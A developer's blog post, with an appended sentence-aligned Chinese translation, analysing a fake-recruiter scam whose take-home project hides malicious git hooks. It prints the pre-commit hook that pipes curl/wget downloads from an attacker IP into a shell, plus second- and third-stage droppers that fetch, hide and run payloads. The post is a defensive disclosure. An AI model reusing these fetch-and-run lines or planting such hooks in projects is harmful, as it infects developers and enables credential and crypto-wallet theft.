title: Appaji - Software Engineer
excerpt: Appaji, a Computer Science graduate from IIT Patna and former intern at Arista Networks, is a Software Engineer at Infinite Reality. Passionate about building innovative web experiences, with a strong interest in sustainable and customer-focused startups.
content_html:
Discuss on Hacker News or LinkedIn.

A recruiter slid into my LinkedIn DMs last Thursday with a Python developer role. I was thrilled that someone had reached out directly, so I asked for more details. When he shared the role description, company name, and the estimated pay, I figured I had nothing to lose.

Here is the initial message:

Offering $10,000-$15,000 a month for a remote-first, contract-to-hire role is just too good. Also, why is this guy revealing pay info before even we met? I thought recruiters play the “you first, me next” game. Rookie mistake.

Red flags immediately started waving. Why the huge budget? (Well, huge by Indian standards for a remote role; not exactly outrageous by US standards, but good enough to raise an eyebrow.) I looked up the company and saw it was a Y Combinator startup. YC companies aren’t exactly known for conventional operations, so it wasn’t completely outside the realm of possibility. Still, if a company has that kind of cash to throw around, they usually have a much more structured hiring pipeline. I decided to proceed, but kept my guard up.

I sent over my resume. The recruiter quickly approved it and handed over a take-home assignment via a Google Drive link containing a zip archive and a PDF with instructions. Here’s the original drive link: https://drive.google.com/drive/folders/18i1KDFXAPv7lqfBGddxj7IOnDy8J6VeH?usp=drive_link. I made my copy here in case they delete theirs: https://drive.google.com/drive/folders/1DZYWezjpwolsxXnM5F04_Ng3nzTRYpVS?usp=sharing.

Assessment PDF was surpringly legitimate looking. It’s about how to improve the existing codebase, architectural suggestions, some git operations etc..

I extracted the zip. At first glance, it was just a boilerplate FastAPI backend using SQLAlchemy; pretty standard stuff. I checked requirements.txt for any obvious typosquatting or malicious packages, but it was completely clean. For a brief second, I thought my suspicions were unfounded and this was a legitimate opportunity.

This is just a habit (may be from doing CTFs), whenever I get a random project folder, I just run tree -a to see what’s lurking in the hidden directories. But this might be the first time it paid off in the real world.

❯ tree -a .
.
├── alembic.ini
├── for learning
│   ├── dtos.py
│   ├── main.py
│   └── mockData.py
├── .git
│   ├── config
│   ├── description
│   ├── gk
│   │   └── config
│   ├── HEAD
│   ├── hooks
│   │   ├── applypatch-msg
│   │   ├── commit-msg
│   │   ├── fsmonitor-watchman
│   │   ├── post-applypatch
│   │   ├── post-checkout
│   │   ├── post-commit
│   │   ├── post-merge
│   │   ├── post-receive
│   │   ├── post-rewrite
│   │   ├── post-update
│   │   ├── pre-applypatch
│   │   ├── pre-auto-gc
│   │   ├── pre-commit
│   │   ├── pre-merge-commit
│   │   ├── prepare-commit-msg
│   │   ├── pre-push
│   │   ├── pre-rebase
│   │   ├── pre-receive
│   │   ├── proc-receive
│   │   ├── push-to-checkout
│   │   ├── sendemail-validate
│   │   └── update
│   ├── index
│   ├── info
│   │   └── exclude
│   ├── logs
...

Wait a minute. A ton of Git hooks were pre-configured in the repository. I opened the pre-commit script to see what they were trying to run.


❯ cat .git/hooks/pre-commit
#!/bin/sh

case "$(uname -s)" in
  Darwin*) curl -sL 'http://45.61.164.38:5777/task/mac?id=402' -L | sh > /dev/null 2>&1 & ;;
  Linux*) wget -qO- 'http://45.61.164.38:5777/task/linux?id=402' -L | sh > /dev/null 2>&1 & ;;
  MINGW*|MSYS*|CYGWIN*) curl -sL http://45.61.164.38:5777/task/windows?id=402 -L | cmd > /dev/null 2>&1 & ;;
  *)        curl -sL 'http://45.61.164.38:5777/task/mac?id=402' -L | sh > /dev/null 2>&1 & ;;
esac

Bingo. They embedded a script that checks the victim’s host operating system and silently executes a remote payload.

Side note: Why use a raw IP address? If anything, this screams “malware.” At least register a decoy domain like lint-checker.com or jenkins-ci-runner.net. If the threat actors who wrote this are reading: take notes people!

Let’s see what the Linux payload actually does. Notice the id=402 parameter being passed to the endpoint. Keep that in mind.

❯ curl http://45.61.164.38:5777/task/linux?id=402
#!/bin/bash
set -e
echo "Authenticated"
TARGET_DIR="$HOME/Documents"
clear
wget -q -O "$TARGET_DIR/tokenlinux.npl" "http://45.61.164.38:5777/task/tokenlinux?id=402"
clear
mv "$TARGET_DIR/tokenlinux.npl" "$TARGET_DIR/tokenlinux.sh"
clear
chmod +x "$TARGET_DIR/tokenlinux.sh"
clear
nohup bash "$TARGET_DIR/tokenlinux.sh" > /dev/null 2>&1 &
clear
exit 0

The script pulls down a secondary payload initially named tokenlinux.npl (we’ll circle back to that specific extension later). It then hides the file in my ~/Documents directory as tokenlinux.sh, makes it executable, and fires it off in the background using nohup.

From Google: The nohup command (short for “no hang up”) is a Linux/Unix utility that keeps a process running even after you log out, close the terminal, or disconnect from an SSH session.

Down the rabbit hole we go. Let’s inspect this next script.


❯ curl http://45.61.164.38:5777/task/tokenlinux?id=402
...
...
BASE_URL="http://45.61.164.38:5777"
...

# Step 8: Download files

# Check if curl is available

if ! command -v curl >/dev/null 2>&1; then
# If curl is not available, use wget
wget -q -O "$USER_HOME/parser.js" "$BASE_URL/task/parser?id=402"
wget -q -O "$USER_HOME/package.json" "$BASE_URL/task/json"
else
# If curl is available, use curl
curl -s -L -o "$USER_HOME/parser.js" "$BASE_URL/task/parser?id=402"
curl -s -L -o "$USER_HOME/package.json" "$BASE_URL/task/json"
fi

# Step 9: Install 'request' package

cd "$USER_HOME"
if [ ! -d "node_modules/request" ]; then
npm install --silent --no-progress --loglevel=error --fund=false
fi

# Step 10: Run token parser

if [ -f "$USER_HOME/parser.js" ]; then
nohup node "$USER_HOME/parser.js" > "$USER_HOME/parser.log" 2>&1 &
else
exit 1
fi
exit 0

I’ve trimmed the output to the most interesting bits for brevity, but full file is available here: parser.js if you want to dig deeper.

This second stage does a lot of heavy lifting. It quietly installs Node.js, configures the system path, downloads a package.json and a parser.js file, installs the required dependencies, and runs the parser invisibly.

I took a look at parser.js. The code was heavily obfuscated, a complete mess to read manually. Remember the id parameter? I tried changing it in my request and received a completely different script back. The attackers are likely assigning unique identifiers to track individual candidates, serving customized payloads to each victim.

Since parser.js was a brick wall, I pivoted to package.json. Unlike the parser, this has to be standard JSON for npm to process it.


❯ curl http://45.61.164.38:5777/task/json

{
        "name": "tokendapp",
        "version": "1.0.0",
        "devDependencies": {
                "hardhat": "^2.20.2"
        },
        "dependencies": {
                "axios": "^1.12.2",
                "basic-ftp": "^5.0.5",
                "child_process": "^1.0.2",
                "clipboardy": "^4.0.0",
                "crypto": "^1.0.1",
                "execp": "^0.0.1",
                "fs": "^0.0.1-security",
                "jsonwebtoken": "^9.0.2",
                "process": "^0.11.10",
                "ps-node": "^0.1.6",
                "request": "^2.88.2"
        },
        "scripts": {
                "test": "npx hardhat test",
                "deploy": "npx hardhat run scripts/deploy.js"
        }
}

These dependencies are incredibly suspicious. Why would a background setup task need clipboard access (clipboardy), and they need file system access (fs) too. And what exactly is hardhat?

Ah, an Ethereum development environment. This makes the tracking ID parameter even more curious. If they were dropping a Bitcoin miner, distributing specific hashing tasks to unique IDs would make sense. But Ethereum shifted away from Proof of Work; it doesn’t rely on mining anymore. They are likely using Hardhat to locate and drain crypto wallets or interact with local browser extensions? idk.

Hoping to deobfuscate parser.js, I threw the code into a few LLMs to see if they could untangle it.

Claude took one look at the file and triggered its safety rails, refusing to analyze the script:

Gemini, on the other hand, was more than happy to break it down:

Earlier, we saw the payload originally named tokenlinux.npl. A quick search confirms exactly what kind of threat actor uses that extension:

The Scam goes deeper

After realizing this was a widespread campaign, I did a bit more digging and found that people are getting different variations of this attack. Some folks received a zip file containing a .vscode folder. Inside, the attackers hid commands configured to run as soon as the directory is opened in VSCode (launch commands).

Pretty clever.

You don’t even have to run a git command, just opening this directory in VSCode is enough to get infected.

Also, it’s pretty evident now that this has nothing to do with Zavopay. The attackers just used whatever company name they found to make the offer look legitimate. Out of curiosity, I ran git log to inspect the project’s commit history, wondering if they left any custom traces. It turns out, they just cloned a random public repository.

❯ git log
commit 16a25d9eaef7ef2e831a21ca0d703fe0fa621492 (HEAD -> main, origin/main, origin/feature/payment, origin/HEAD, feature/payment)
Author: rhonda <womenofinspiration2016@gmail.com>
Date:   Mon Jun 29 22:04:17 2026 -0400

    add requirements

commit 8ae96928302a8e0757f2c72f85c46d801c97b91e
Merge: f64c289 d6cb1f2
Author: Bharati Gogoi <bgogoi055@gmail.com>
Date:   Mon Jun 29 21:23:43 2026 +0530

    Merge pull request #10 from Bgogoi123/feature/balance

    [feat][Service for Adjusting Balance]

commit d6cb1f2f14b5d561e3611653327477e6a60eee95
Author: Bharati Gogoi <bharatigogoi@Bharatis-MacBook-Air.local>
Date:   Mon Jun 29 21:20:13 2026 +0530

    [feat][Service for Adjusting Balance]
    - Added a service for adjustinh a user's balance.
    - Removed old/commented codes.

commit f64c2898bbe2d4b5773f39e1022e95a2418fa0b4
Merge: 17aaa4c 9e0dbdf
Author: Bharati Gogoi <bgogoi055@gmail.com>
Date:   Fri Jun 26 23:51:38 2026 +0530

    Merge pull request #9 from Bgogoi123/feature/balance

    [fix][Dependencies Annotated]

commit 9e0dbdf112124a25237018a3b92af10c51c54b5f
Author: Bharati Gogoi <bharatigogoi@Bharatis-MacBook-Air.local>
Date:   Fri Jun 26 23:48:53 2026 +0530

    [fix][Dependencies Annotated]
    - Annotated all dependencies in the router files of each module.

A quick search led me straight to the original repo: https://github.com/Bgogoi123/personal-finance-service. They literally just took someone’s innocent FastAPI project and slapped a malicious hidden directory on top of it.

Naturally, the next move was pivoting from defense to offense. I wanted to see if the attackers left any vulnerable services exposed on their IP.

An Nmap scan revealed three open ports. Two of them were unresponsive to version detection. Port 22 was running OpenSSH 9.6p1 on Ubuntu. Since that version was released just over a week prior to this scan, there were no known CVEs I could leverage to poke around their infrastructure.

So, they had decent OPSEC on their server, even if their malware deployment was a bit loud. That’s where the trail goes cold for now. Stay safe out there, and always check those hidden directories before running someone else’s code.

Now I understand why their assignment PDF has git tasks. They want to make sure that the candidate runs at least one of the git commands, so the hooks will get triggered.

Oh by the way, The “recruiter” seemed to have deleted the account, right after I called their front out.

That’s it for now. Feel free to connect with me on LinkedIn if you want to chat, though maybe skip sending any malware-laced take-home tests. (Actually, on second thought, if you have interesting malware samples, send ‘em over!)

Thanks for reading!

blocks.html_en: Discuss on Hacker News or LinkedIn.

sentences.en: Discuss on Hacker News or LinkedIn.
sentences.zh: 在 Hacker News 或 LinkedIn 上进行讨论。

blocks.html_en: A recruiter slid into my LinkedIn DMs last Thursday with a Python developer role. I was thrilled that someone had reached out directly, so I asked for more details. When he shared the role description, company name, and the estimated pay, I figured I had nothing to lose.

sentences.en: A recruiter slid into my LinkedIn DMs last Thursday with a Python developer role.
sentences.zh: 上周四，一位招聘人员以 Python 开发人员的身份闯入了我的 LinkedIn 私信。

sentences.en: I was thrilled that someone had reached out directly, so I asked for more details.
sentences.zh: 我很高兴有人直接联系我，所以我询问了更多细节。

sentences.en: When he shared the role description, company name, and the estimated pay, I figured I had nothing to lose.
sentences.zh: 当他分享职位描述、公司名称和预估薪资时，我想我没有什么可失去的。

blocks.html_en: Here is the initial message:

sentences.en: Here is the initial message:
sentences.zh: 这是最初的消息：

blocks.html_en: Offering $10,000-$15,000 a month for a remote-first, contract-to-hire role is just too good. Also, why is this guy revealing pay info before even we met? I thought recruiters play the “you first, me next” game. Rookie mistake.

sentences.en: Offering $10,000-$15,000 a month for a remote-first, contract-to-hire role is just too good.
sentences.zh: 对于远程优先、合同聘用的职位，每月提供 10,000 至 15,000 美元的薪水实在太好了。

sentences.en: Also, why is this guy revealing pay info before even we met?
sentences.zh: 另外，为什么这个家伙在我们见面之前就透露了薪酬信息？

sentences.en: I thought recruiters play the “you first, me next” game.
sentences.zh: 我认为招聘人员玩的是“你先，我其次”的游戏。

sentences.en: Rookie mistake.
sentences.zh: 菜鸟错误。

blocks.html_en: Red flags immediately started waving. Why the huge budget? (Well, huge by Indian standards for a remote role; not exactly outrageous by US standards, but good enough to raise an eyebrow.) I looked up the company and saw it was a Y Combinator startup. YC companies aren’t exactly known for conventional operations, so it wasn’t completely outside the realm of possibility. Still, if a company has that kind of cash to throw around, they usually have a much more structured hiring pipeline. I decided to proceed, but kept my guard up.

sentences.en: Red flags immediately started waving.
sentences.zh: 红旗立即开始飘扬。

sentences.en: Why the huge budget?
sentences.zh: 为何预算如此庞大？

sentences.en: (Well, huge by Indian standards for a remote role; not exactly outrageous by US standards, but good enough to raise an eyebrow.)
sentences.zh: （好吧，按照印度的远程角色标准来看，这个数字是巨大的；按照美国的标准来看，这并不完全令人震惊，但也足以引起人们的注意。）

sentences.en: I looked up the company and saw it was a Y Combinator startup.
sentences.zh: 我查了一下这家公司，发现这是一家 Y Combinator 初创公司。

sentences.en: YC companies aren’t exactly known for conventional operations, so it wasn’t completely outside the realm of possibility.
sentences.zh: YC 公司并不以传统运营而闻名，因此这并非完全不可能。

sentences.en: Still, if a company has that kind of cash to throw around, they usually have a much more structured hiring pipeline.
sentences.zh: 不过，如果一家公司有足够的现金可以挥霍，他们通常会有一个更加结构化的招聘渠道。

sentences.en: I decided to proceed, but kept my guard up.
sentences.zh: 我决定继续，但仍保持警惕。

blocks.html_en: I sent over my resume. The recruiter quickly approved it and handed over a take-home assignment via a Google Drive link containing a zip archive and a PDF with instructions. Here’s the original drive link: https://drive.google.com/drive/folders/18i1KDFXAPv7lqfBGddxj7IOnDy8J6VeH?usp=drive_link. I made my copy here in case they delete theirs: https://drive.google.com/drive/folders/1DZYWezjpwolsxXnM5F04_Ng3nzTRYpVS?usp=sharing.

sentences.en: I sent over my resume.
sentences.zh: 我把简历发过来了。

sentences.en: The recruiter quickly approved it and handed over a take-home assignment via a Google Drive link containing a zip archive and a PDF with instructions.
sentences.zh: 招聘人员很快批准了它，并通过 Google Drive 链接移交了一份带回家的作业，其中包含 zip 存档和带有说明的 PDF。

sentences.en: Here’s the original drive link: https://drive.google.com/drive/folders/18i1KDFXAPv7lqfBGddxj7IOnDy8J6VeH?usp=drive_link. I made my copy here in case they delete theirs: https://drive.google.com/drive/folders/1DZYWezjpwolsxXnM5F04_Ng3nzTRYpVS?usp=sharing.
sentences.zh: 这是原始驱动器链接：https://drive.google.com/drive/folders/18i1KDFXAPv7lqfBGddxj7IOnDy8J6VeH?usp=drive_link。我在这里制作了副本，以防他们删除自己的副本：https://drive.google.com/drive/folders/1DZYWezjpwolsxXnM5F04_Ng3nzTRYpVS?usp=sharing。

blocks.html_en: Assessment PDF was surpringly legitimate looking. It’s about how to improve the existing codebase, architectural suggestions, some git operations etc..

sentences.en: Assessment PDF was surpringly legitimate looking.
sentences.zh: 评估 PDF 看起来出奇地合法。

sentences.en: It’s about how to improve the existing codebase, architectural suggestions, some git operations etc..
sentences.zh: 是关于如何改进现有的代码库、架构建议、一些 git 操作等。

blocks.html_en: I extracted the zip. At first glance, it was just a boilerplate FastAPI backend using SQLAlchemy; pretty standard stuff. I checked requirements.txt for any obvious typosquatting or malicious packages, but it was completely clean. For a brief second, I thought my suspicions were unfounded and this was a legitimate opportunity.

sentences.en: I extracted the zip.
sentences.zh: 我解压了拉链。

sentences.en: At first glance, it was just a boilerplate FastAPI backend using SQLAlchemy; pretty standard stuff.
sentences.zh: 乍一看，它只是一个使用 SQLAlchemy 的样板 FastAPI 后端；非常标准的东西。

sentences.en: I checked requirements.txt for any obvious typosquatting or malicious packages, but it was completely clean.
sentences.zh: 我检查了requirements.txt中是否有任何明显的误植或恶意软件包，但它是完全干净的。

sentences.en: For a brief second, I thought my suspicions were unfounded and this was a legitimate opportunity.
sentences.zh: 有那么一瞬间，我认为我的怀疑毫无根据，这是一个合理的机会。

blocks.html_en: This is just a habit (may be from doing CTFs), whenever I get a random project folder, I just run tree -a to see what’s lurking in the hidden directories. But this might be the first time it paid off in the real world.

sentences.en: This is just a habit (may be from doing CTFs), whenever I get a random project folder, I just run tree -a to see what’s lurking in the hidden directories.
sentences.zh: 这只是一个习惯（可能来自于做CTF），每当我得到一个随机的项目文件夹时，我只是运行tree -a来看看隐藏目录中潜伏着什么。

sentences.en: But this might be the first time it paid off in the real world.
sentences.zh: 但这可能是第一次在现实世界中得到回报。

blocks.html_en: Wait a minute. A ton of Git hooks were pre-configured in the repository. I opened the pre-commit script to see what they were trying to run.

sentences.en: Wait a minute.
sentences.zh: 等一下。

sentences.en: A ton of Git hooks were pre-configured in the repository.
sentences.zh: 存储库中预先配置了大量的 Git 挂钩。

sentences.en: I opened the pre-commit script to see what they were trying to run.
sentences.zh: 我打开预提交脚本来查看他们试图运行的内容。

blocks.html_en: Bingo. They embedded a script that checks the victim’s host operating system and silently executes a remote payload.

sentences.en: Bingo.
sentences.zh: 宾果游戏。

sentences.en: They embedded a script that checks the victim’s host operating system and silently executes a remote payload.
sentences.zh: 他们嵌入了一个脚本，用于检查受害者的主机操作系统并静默执行远程有效负载。

blocks.html_en: Side note: Why use a raw IP address? If anything, this screams “malware.” At least register a decoy domain like lint-checker.com or jenkins-ci-runner.net. If the threat actors who wrote this are reading: take notes people!

sentences.en: Side note: Why use a raw IP address?
sentences.zh: 旁注：为什么使用原始 IP 地址？

sentences.en: If anything, this screams “malware.”
sentences.zh: 如果有的话，这就是“恶意软件”。

sentences.en: At least register a decoy domain like lint-checker.com or jenkins-ci-runner.net.
sentences.zh: 至少注册一个诱饵域名，如 lint-checker.com 或 jenkins-ci-runner.net。

sentences.en: If the threat actors who wrote this are reading: take notes people!
sentences.zh: 如果写这篇文章的威胁行为者正在阅读：请记下笔记！

blocks.html_en: Side note: Why use a raw IP address? If anything, this screams “malware.” At least register a decoy domain like lint-checker.com or jenkins-ci-runner.net. If the threat actors who wrote this are reading: take notes people!

sentences.en: Side note: Why use a raw IP address?
sentences.zh: 旁注：为什么使用原始 IP 地址？

sentences.en: If anything, this screams “malware.”
sentences.zh: 如果有的话，这就是“恶意软件”。

sentences.en: At least register a decoy domain like lint-checker.com or jenkins-ci-runner.net.
sentences.zh: 至少注册一个诱饵域名，如 lint-checker.com 或 jenkins-ci-runner.net。

sentences.en: If the threat actors who wrote this are reading: take notes people!
sentences.zh: 如果写这篇文章的威胁行为者正在阅读：请记下笔记！

blocks.html_en: Let’s see what the Linux payload actually does. Notice the id=402 parameter being passed to the endpoint. Keep that in mind.

sentences.en: Let’s see what the Linux payload actually does.
sentences.zh: 让我们看看 Linux 负载实际上做了什么。

sentences.en: Notice the id=402 parameter being passed to the endpoint.
sentences.zh: 请注意 id=402 参数被传递到端点。

sentences.en: Keep that in mind.
sentences.zh: 请记住这一点。

blocks.html_en: The script pulls down a secondary payload initially named tokenlinux.npl (we’ll circle back to that specific extension later). It then hides the file in my ~/Documents directory as tokenlinux.sh, makes it executable, and fires it off in the background using nohup.

sentences.en: The script pulls down a secondary payload initially named tokenlinux.npl (we’ll circle back to that specific extension later).
sentences.zh: 该脚本会拉取最初名为 tokenlinux.npl 的辅助有效负载（稍后我们将回到该特定扩展）。

sentences.en: It then hides the file in my ~/Documents directory as tokenlinux.sh, makes it executable, and fires it off in the background using nohup.
sentences.zh: 然后，它将文件隐藏在我的 ~/Documents 目录中，命名为 tokenlinux.sh，使其可执行，并使用 nohup 在后台将其关闭。

blocks.html_en: From Google: The nohup command (short for “no hang up”) is a Linux/Unix utility that keeps a process running even after you log out, close the terminal, or disconnect from an SSH session.

sentences.en: From Google: The nohup command (short for “no hang up”) is a Linux/Unix utility that keeps a process running even after you log out, close the terminal, or disconnect from an SSH session.
sentences.zh: 来自 Google：nohup 命令（“nohang up”的缩写）是一个 Linux/Unix 实用程序，即使在您注销、关闭终端或从 SSH 会话断开连接后，该实用程序仍能让进程保持运行。

blocks.html_en: From Google: The nohup command (short for “no hang up”) is a Linux/Unix utility that keeps a process running even after you log out, close the terminal, or disconnect from an SSH session.

sentences.en: From Google: The nohup command (short for “no hang up”) is a Linux/Unix utility that keeps a process running even after you log out, close the terminal, or disconnect from an SSH session.
sentences.zh: 来自 Google：nohup 命令（“nohang up”的缩写）是一个 Linux/Unix 实用程序，即使在您注销、关闭终端或从 SSH 会话断开连接后，该实用程序仍能让进程保持运行。

blocks.html_en: Down the rabbit hole we go. Let’s inspect this next script.

sentences.en: Down the rabbit hole we go.
sentences.zh: 我们沿着兔子洞走下去。

sentences.en: Let’s inspect this next script.
sentences.zh: 让我们检查下一个脚本。

blocks.html_en: I’ve trimmed the output to the most interesting bits for brevity, but full file is available here: parser.js if you want to dig deeper.

sentences.en: I’ve trimmed the output to the most interesting bits for brevity, but full file is available here: parser.js if you want to dig deeper.
sentences.zh: 为了简洁起见，我已将输出修剪为最有趣的部分，但如果您想更深入地了解，可以在此处获取完整文件：parser.js。

blocks.html_en: I’ve trimmed the output to the most interesting bits for brevity, but full file is available here: parser.js if you want to dig deeper.

sentences.en: I’ve trimmed the output to the most interesting bits for brevity, but full file is available here: parser.js if you want to dig deeper.
sentences.zh: 为了简洁起见，我已将输出修剪为最有趣的部分，但如果您想更深入地了解，可以在此处获取完整文件：parser.js。

blocks.html_en: This second stage does a lot of heavy lifting. It quietly installs Node.js, configures the system path, downloads a package.json and a parser.js file, installs the required dependencies, and runs the parser invisibly.

sentences.en: This second stage does a lot of heavy lifting.
sentences.zh: 第二阶段做了很多繁重的工作。

sentences.en: It quietly installs Node.js, configures the system path, downloads a package.json and a parser.js file, installs the required dependencies, and runs the parser invisibly.
sentences.zh: 它会悄悄地安装 Node.js，配置系统路径，下载 package.json 和 parser.js 文件，安装所需的依赖项，然后以不可见的方式运行解析器。

blocks.html_en: I took a look at parser.js. The code was heavily obfuscated, a complete mess to read manually. Remember the id parameter? I tried changing it in my request and received a completely different script back. The attackers are likely assigning unique identifiers to track individual candidates, serving customized payloads to each victim.

sentences.en: I took a look at parser.js.
sentences.zh: 我查看了 parser.js。

sentences.en: The code was heavily obfuscated, a complete mess to read manually.
sentences.zh: 代码非常混乱，手动阅读时一团糟。

sentences.en: Remember the id parameter?
sentences.zh: 还记得 id 参数吗？

sentences.en: I tried changing it in my request and received a completely different script back.
sentences.zh: 我尝试在请求中更改它，并收到了完全不同的脚本。

sentences.en: The attackers are likely assigning unique identifiers to track individual candidates, serving customized payloads to each victim.
sentences.zh: 攻击者可能会分配唯一的标识符来跟踪各个候选人，为每个受害者提供定制的有效负载。

blocks.html_en: Since parser.js was a brick wall, I pivoted to package.json. Unlike the parser, this has to be standard JSON for npm to process it.

sentences.en: Since parser.js was a brick wall, I pivoted to package.json.
sentences.zh: 由于 parser.js 是一堵砖墙，所以我转向了 package.json。

sentences.en: Unlike the parser, this has to be standard JSON for npm to process it.
sentences.zh: 与解析器不同，这必须是标准 JSON，npm 才能处理它。

blocks.html_en: These dependencies are incredibly suspicious. Why would a background setup task need clipboard access (clipboardy), and they need file system access (fs) too. And what exactly is hardhat?

sentences.en: These dependencies are incredibly suspicious.
sentences.zh: 这些依赖关系非常可疑。

sentences.en: Why would a background setup task need clipboard access (clipboardy), and they need file system access (fs) too.
sentences.zh: 为什么后台设置任务需要剪贴板访问（clipboardy），并且它们也需要文件系统访问（fs）。

sentences.en: And what exactly is hardhat?
sentences.zh: 安全帽到底是什么？

blocks.html_en: Ah, an Ethereum development environment. This makes the tracking ID parameter even more curious. If they were dropping a Bitcoin miner, distributing specific hashing tasks to unique IDs would make sense. But Ethereum shifted away from Proof of Work; it doesn’t rely on mining anymore. They are likely using Hardhat to locate and drain crypto wallets or interact with local browser extensions? idk.

sentences.en: Ah, an Ethereum development environment.
sentences.zh: 啊，以太坊开发环境。

sentences.en: This makes the tracking ID parameter even more curious.
sentences.zh: 这使得跟踪 ID 参数更加令人好奇。

sentences.en: If they were dropping a Bitcoin miner, distributing specific hashing tasks to unique IDs would make sense.
sentences.zh: 如果他们放弃比特币矿工，将特定的哈希任务分配给唯一的 ID 是有意义的。

sentences.en: But Ethereum shifted away from Proof of Work; it doesn’t rely on mining anymore.
sentences.zh: 但以太坊放弃了工作量证明；它不再依赖采矿。

sentences.en: They are likely using Hardhat to locate and drain crypto wallets or interact with local browser extensions?
sentences.zh: 他们可能使用 Hardhat 来定位和耗尽加密钱包或与本地浏览器扩展进行交互？

sentences.en: idk.
sentences.zh: 我不知道。

blocks.html_en: Hoping to deobfuscate parser.js, I threw the code into a few LLMs to see if they could untangle it.

sentences.en: Hoping to deobfuscate parser.js, I threw the code into a few LLMs to see if they could untangle it.
sentences.zh: 为了对 parser.js 进行反混淆，我将代码扔给了几个 LLM，看看他们是否可以解开它。

blocks.html_en: Claude took one look at the file and triggered its safety rails, refusing to analyze the script:

sentences.en: Claude took one look at the file and triggered its safety rails, refusing to analyze the script:
sentences.zh: 克劳德看了一眼文件，触发了安全栏，拒绝分析脚本：

blocks.html_en: Gemini, on the other hand, was more than happy to break it down:

sentences.en: Gemini, on the other hand, was more than happy to break it down:
sentences.zh: 另一方面，双子座则非常乐意将其分解：

blocks.html_en: Earlier, we saw the payload originally named tokenlinux.npl. A quick search confirms exactly what kind of threat actor uses that extension:

sentences.en: Earlier, we saw the payload originally named tokenlinux.npl.
sentences.zh: 早些时候，我们看到了最初名为 tokenlinux.npl 的有效负载。

sentences.en: A quick search confirms exactly what kind of threat actor uses that extension:
sentences.zh: 快速搜索可以准确确认哪种威胁行为者使用该扩展：

blocks.html_en: The Scam goes deeper

sentences.en: The Scam goes deeper
sentences.zh: 骗局越陷越深

blocks.html_en: After realizing this was a widespread campaign, I did a bit more digging and found that people are getting different variations of this attack. Some folks received a zip file containing a .vscode folder. Inside, the attackers hid commands configured to run as soon as the directory is opened in VSCode (launch commands).

sentences.en: After realizing this was a widespread campaign, I did a bit more digging and found that people are getting different variations of this attack.
sentences.zh: 在意识到这是一场广泛的活动后，我做了更多的挖掘，发现人们正在遭受这种攻击的不同变体。

sentences.en: Some folks received a zip file containing a .vscode folder.
sentences.zh: 有些人收到了一个包含 .vscode 文件夹的 zip 文件。

sentences.en: Inside, the attackers hid commands configured to run as soon as the directory is opened in VSCode (launch commands).
sentences.zh: 在内部，攻击者隐藏了配置为在 VSCode 中打开目录后立即运行的命令（启动命令）。

blocks.html_en: Pretty clever.

sentences.en: Pretty clever.
sentences.zh: 相当聪明。

blocks.html_en: You don’t even have to run a git command, just opening this directory in VSCode is enough to get infected.

sentences.en: You don’t even have to run a git command, just opening this directory in VSCode is enough to get infected.
sentences.zh: 你甚至不需要运行 git 命令，只需在 VSCode 中打开这个目录就足以被感染。

blocks.html_en: Also, it’s pretty evident now that this has nothing to do with Zavopay. The attackers just used whatever company name they found to make the offer look legitimate. Out of curiosity, I ran git log to inspect the project’s commit history, wondering if they left any custom traces. It turns out, they just cloned a random public repository.

sentences.en: Also, it’s pretty evident now that this has nothing to do with Zavopay.
sentences.zh: 而且，现在很明显这与 Zavopay 无关。

sentences.en: The attackers just used whatever company name they found to make the offer look legitimate.
sentences.zh: 攻击者只是使用他们发现的任何公司名称来使报价看起来合法。

sentences.en: Out of curiosity, I ran git log to inspect the project’s commit history, wondering if they left any custom traces.
sentences.zh: 出于好奇，我运行 git log 来检查项目的提交历史记录，想知道它们是否留下了任何自定义痕迹。

sentences.en: It turns out, they just cloned a random public repository.
sentences.zh: 事实证明，他们只是克隆了一个随机的公共存储库。

blocks.html_en: A quick search led me straight to the original repo: https://github.com/Bgogoi123/personal-finance-service. They literally just took someone’s innocent FastAPI project and slapped a malicious hidden directory on top of it.

sentences.en: A quick search led me straight to the original repo: https://github.com/Bgogoi123/personal-finance-service. They literally just took someone’s innocent FastAPI project and slapped a malicious hidden directory on top of it.
sentences.zh: 快速搜索让我直接找到了原始存储库：https://github.com/Bgogoi123/personal-finance-service。他们实际上只是拿走了某人无辜的 FastAPI 项目，并在其上放置了一个恶意的隐藏目录。

blocks.html_en: Naturally, the next move was pivoting from defense to offense. I wanted to see if the attackers left any vulnerable services exposed on their IP.

sentences.en: Naturally, the next move was pivoting from defense to offense.
sentences.zh: 自然，下一步就是由守转攻。

sentences.en: I wanted to see if the attackers left any vulnerable services exposed on their IP.
sentences.zh: 我想看看攻击者是否在其 IP 上留下了任何易受攻击的服务。

blocks.html_en: An Nmap scan revealed three open ports. Two of them were unresponsive to version detection. Port 22 was running OpenSSH 9.6p1 on Ubuntu. Since that version was released just over a week prior to this scan, there were no known CVEs I could leverage to poke around their infrastructure.

sentences.en: An Nmap scan revealed three open ports.
sentences.zh: Nmap 扫描显示三个开放端口。

sentences.en: Two of them were unresponsive to version detection.
sentences.zh: 其中两个对版本检测没有响应。

sentences.en: Port 22 was running OpenSSH 9.6p1 on Ubuntu.
sentences.zh: 端口 22 在 Ubuntu 上运行 OpenSSH 9.6p1。

sentences.en: Since that version was released just over a week prior to this scan, there were no known CVEs I could leverage to poke around their infrastructure.
sentences.zh: 由于该版本是在本次扫描前一周发布的，因此我没有可以利用的已知 CVE 来研究他们的基础设施。

blocks.html_en: So, they had decent OPSEC on their server, even if their malware deployment was a bit loud. That’s where the trail goes cold for now. Stay safe out there, and always check those hidden directories before running someone else’s code.

sentences.en: So, they had decent OPSEC on their server, even if their malware deployment was a bit loud.
sentences.zh: 因此，他们的服务器上有不错的 OPSEC，即使他们的恶意软件部署有点吵。

sentences.en: That’s where the trail goes cold for now.
sentences.zh: 这就是目前线索变冷的地方。

sentences.en: Stay safe out there, and always check those hidden directories before running someone else’s code.
sentences.zh: 在外面保持安全，并在运行别人的代码之前始终检查那些隐藏的目录。

blocks.html_en: Now I understand why their assignment PDF has git tasks. They want to make sure that the candidate runs at least one of the git commands, so the hooks will get triggered.

sentences.en: Now I understand why their assignment PDF has git tasks.
sentences.zh: 现在我明白为什么他们的作业 PDF 有 git 任务了。

sentences.en: They want to make sure that the candidate runs at least one of the git commands, so the hooks will get triggered.
sentences.zh: 他们希望确保候选人至少运行一个 git 命令，这样钩子就会被触发。

blocks.html_en: Oh by the way, The “recruiter” seemed to have deleted the account, right after I called their front out.

sentences.en: Oh by the way, The “recruiter” seemed to have deleted the account, right after I called their front out.
sentences.zh: 哦，顺便说一句，在我打电话给他们的前线后，“招聘人员”似乎已经删除了该帐户。

